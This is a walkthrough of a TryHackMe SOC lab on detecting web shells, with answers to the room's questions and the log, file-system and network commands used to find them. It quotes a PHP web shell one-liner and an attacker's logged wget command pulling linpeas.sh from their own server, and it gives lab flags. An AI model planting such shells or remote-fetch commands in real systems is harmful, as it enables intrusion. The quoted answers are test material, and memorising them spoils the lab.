---
title: Detecting Web Shells Walkthrough
description: Uncover web shells by checking file systems, logs, and network traffic.
pubDate: 2026-11-03
categories:
  - SOC
  - Walkthrough
  - TryHackMe
  - Network
tags:
  - Lessons
image: /image/networksecess.png
---
---
## Summary

In this room we covered how web shells work, how attackers use them for persistent remote command execution (`T1505.003`), and how to hunt for them across web server logs, `auditd` logs, file systems, and network traffic. In the final investigation, we analyzed `/var/log/apache2/access.log` using `grep` to trace an attacker enumerating `/wordpress`, uploading `shadyshell.php` via `upload_form.php`, running reconnaissance commands, and downloading `linpeas.sh`.

---

**Learning Objectives**

- Understand what web shells are and how attackers use them
- Detect web shell activity through log, file system, and network analysis
- Understand common tooling in web shell detection

---
## Task 1.1

**Which MITRE ATT&CK Persistence sub-technique are web shells associated with?**  
**Answer**: `T1505.003`

**Why?**
Checking the MITRE ATT&CK page for `Server Software Component: Web Shell`, the sub-technique ID under Persistence (`T1505`) is `T1505.003`.

![](../../assets/Pasted%20image%2020261106033516.png)
## Task 1.2

**What file extension is commonly used for web shells targeting Microsoft Exchange?**  
**Answer**: `.aspx`

**Why?**
Under the "Hafnium & ProxyLogon" section, the Chinese APT group Hafnium uploaded and modified `.aspx` web shells on Windows Exchange servers.

![](../../assets/Pasted%20image%2020261106033952.png)
## Task 2.1

**Access the shell and determine which account you have access to by running the whoami command.**  
**Answer**: `www-data`

**Why?**
Opening `http://127.0.0.1:8080/files/awebshell.php` and running `whoami` (`?cmd=whoami`) returns `www-data`, which is the default Apache web server user.

![](../../assets/Pasted%20image%2020261106034022.png)
## Task 2.2

**List the directory contents and find the flag using the ls and cat commands.**  
**Answer**: `THM{W3b_Sh3ll_Usag3}`

**Why?**
Running `ls` in the web shell (`?cmd=ls`) shows `awebshell.php` and `flag.txt`. Running `cat flag.txt` (`?cmd=cat+flag.txt`) prints `THM{W3b_Sh3ll_Usag3}`.
![](../../assets/Pasted%20image%2020261106034401.png)

![](../../assets/Pasted%20image%2020261106034425.png)
## Task 3.1

**What is the part of the URL that associates values to parameters and can be a valuable indicator of web shell activity?**  
**Answer**: `query strings`

**Why?**
In web access logs, `query strings` (the part of the URL after `?` associating values with parameters like `?cmd=` or `?exec=`) are a key indicator of commands being passed to a web shell.
![](../../assets/Pasted%20image%2020261106035127.png)

## Task 3.2

**What auditd syscall would confirm that a file was written to disk following a suspicious POST request to /upload.php?**  
**Answer**: `creat`

**Why?**
Correlating web logs with `auditd` events lets us link a suspicious `POST` request to a `creat` syscall (confirming a file was written to disk) or an `execve` syscall (confirming a command was executed).

![](../../assets/Pasted%20image%2020261106035359.png)
## Task 4.1

**What command would you use to locate .php files in the /var/www/ directory?**  
**Answer**: `find /var/www/ -type f -name "*.php"`

**Why?**
Using the Linux `find` command with `-type f` (regular files) and `-name "*.php"` searches recursively inside `/var/www/` for any PHP scripts.


## Task 4.2

**Which Wireshark filter would you use to search specifically for PUT requests?**  
**Answer**: `http.request.method == "PUT"`

**Why?**
In Wireshark, filtering by HTTP request method uses `http.request.method == "PUT"` (or `"POST"`) to spot file uploads over HTTP.


## Task 5.1

**Which IP address likely belongs to the attacker?**  
**Answer**: `203.0.113.66`

**Why?**
Running `cat /var/log/apache2/access.log | grep "404"` shows a flood of directory enumeration requests with User-Agent `"ashadyagent/1.1"` coming from `203.0.113.66`.
![](../../assets/Pasted%20image%2020261106044150.png)

![](../../assets/Pasted%20image%2020261106044140.png)
## Task 5.2

**What is the first directory that the attacker successfully identifies?**  
**Answer**: `/wordpress`

**Why?**
Filtering for successful responses with `cat /var/log/apache2/access.log | grep "200"` shows that right after hitting `/`, the first directory discovered by `203.0.113.66` with HTTP status `200` is `/wordpress`.

![](../../assets/Pasted%20image%2020261106044338.png)

![](../../assets/Pasted%20image%2020261106044309.png)
## Task 5.3

**What is the name of the .php file the attacker uses to upload the web shell?**  
**Answer**: `upload_form.php`

**Why?**
Filtering for PHP requests (`cat /var/log/apache2/access.log | grep ".php"`) shows `GET /wordpress/wp-content/uploads/upload_form.php` followed by `POST /wordpress/wp-content/uploads/upload_form.php?file=shadyshell.php`.
![](../../assets/Pasted%20image%2020261106044454.png)

![](../../assets/Pasted%20image%2020261106044446.png)
## Task 5.4

**What is the first command run by the attacker using the newly uploaded web shell?**  
**Answer**: `whoami`

**Why?**
Right after accessing `shadyshell.php`, the first command executed via the `cmd` parameter at `06:14:55` is `GET /wordpress/wp-content/uploads/shadyshell.php?cmd=whoami`.
![](../../assets/Pasted%20image%2020261106044623.png)
## Task 5.5

**After gaining access via the web shell, the attacker uses a command to download a second file onto the server. What is the name of this file?**  
**Answer**: `linpeas.sh`

**Why?**
At `06:20:36`, the attacker runs `GET /wordpress/wp-content/uploads/shadyshell.php?cmd=wget%20http://203.0.113.66:8000/linpeas.sh`, downloading `linpeas.sh`.
![](../../assets/Pasted%20image%2020261106044652.png)
## Task 5.6

**The attacker has hidden a secret within the web shell. Use cat to investigate the web shell code and find the flag.**  
**Answer**: `THM{W3b_Sh3ll_Int3rnals}`

**Why?**
Running `cat /var/www/html/wordpress/wp-content/uploads/shadyshell.php` reveals the PHP one-liner `<?php system($_GET['cmd']); ?>` and an HTML comment containing `<!-- FLAG: THM{W3b_Sh3ll_Int3rnals} -->`.
![](../../assets/Pasted%20image%2020261106045340.png)
